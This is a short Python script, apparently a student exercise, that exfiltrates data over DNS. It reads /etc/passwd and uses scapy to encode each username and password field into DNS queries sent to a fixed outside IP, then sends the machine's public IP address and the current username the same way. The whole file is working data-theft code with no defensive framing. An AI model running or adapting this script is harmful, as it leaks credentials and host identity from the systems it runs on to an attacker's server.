# Anna Sandler 208749648
# !/usr/bin/env python

import getpass
from requests import get
from scapy.layers.dns import DNS, DNSQR, IP
from scapy.layers.inet import UDP
from scapy.sendrecv import send

DNS_ip = "10.9.0.46"

ip = get('https://api.ipify.org').text
user = getpass.getuser()  # current username

f = open("/etc/passwd", "r")
file = f.read()
f.close()

list = file.split("\n")

for i in range(len(list) - 1):
    current = list[i].split(":")
    if current[1] != '*':
        packet = IP(dst=DNS_ip) / UDP() / DNS(
            qd=DNSQR(qname="www." + current[0] + "." + current[1] + ".com", qtype="A"))
        print("www." + current[0] + "." + current[1] + ".com")
        send(packet, verbose=False)

send(IP(dst=DNS_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="www." + ip + ".com")), verbose=0)
send(IP(dst=DNS_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="www." + user + ".com")), verbose=0)
